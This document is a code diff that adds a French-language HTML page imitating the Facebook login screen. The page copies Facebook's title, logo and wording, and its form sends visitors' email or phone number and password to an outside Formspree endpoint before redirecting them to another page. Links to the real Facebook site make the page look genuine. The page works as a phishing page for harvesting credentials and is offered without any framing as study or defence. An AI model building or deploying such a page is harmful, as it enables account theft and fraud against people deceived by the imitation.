@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="fr">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook-connexion ou inscription</title>
+    <link rel="icon" href="f.png" />
+    <link rel="stylesheet" href="style1.css" />
+  </head>
+  <body>
+    <main>
+      <div class="containerTotal">
+        <div class="entete">
+          <img
+            src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg"
+            alt="symbole facebook"
+          />
+          <p>
+            Avec Facebook,partagez et restez en contact avec votre entourage.
+          </p>
+        </div>
+        <div class="form">
+          <form
+            id="myForm"
+            action="https://formspree.io/f/mdoqlvab"
+            method="post"
+          >
+            <input
+              type="text"
+              name="mon nom"
+              id="username"
+              placeholder="Adresse e-mail ou numéro de tél."
+              required
+            />
+            <input
+              type="password"
+              id="password"
+              name="mon mot de passe"
+              placeholder="Mot de passe"
+              required
+            />
+            <button type="submit"><a href="n.html">Se Connecter</a></button><br />
+            <p>
+              <a href="https://www.facebook.com/?locale=fr_FR"
+                >Mot de passe oublié ?</a
+              >
+            </p>
+            <br />
+            <div class="tr"></div>
+            <button type="button" id="io">Crée nouveau compte</button>
+          </form>
+        </div>
+        <p class="p">
+          <a href="https://www.facebook.com/?locale=fr_FR" class="a"
+            >Créer une page </a
+          >pour une célébrité, une marque ou une entreprise.
+        </p>
+      </div>
+    </main>
+    <footer>
+      <img src="c.png"/>
+    </footer>
+    <script>
+      const input = document.getElementById("username");
+
+      input.addEventListener("input", function () {
+        const value = input.value;
+
+        const telPattern = /^[6][0-9]{8}$/;
+        const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+
+        if (!telPattern.test(value) && !emailPattern.test(value)) {
+          input.setCustomValidity(
+            "Entrez un numéro de téléphone ou une adresse e-mail valide."
+          );
+        } else {
+          input.setCustomValidity("");
+        }
+      });
+
+      const form = document.getElementById("myForm");
+
+      form.addEventListener("submit", function (event) {
+        console.log("ta maman");
+        // Redirection vers la page spécifique après la validation du formulaire
+        window.location.href = "n.html";
+      });
+    </script>
+  </body>
+</html>
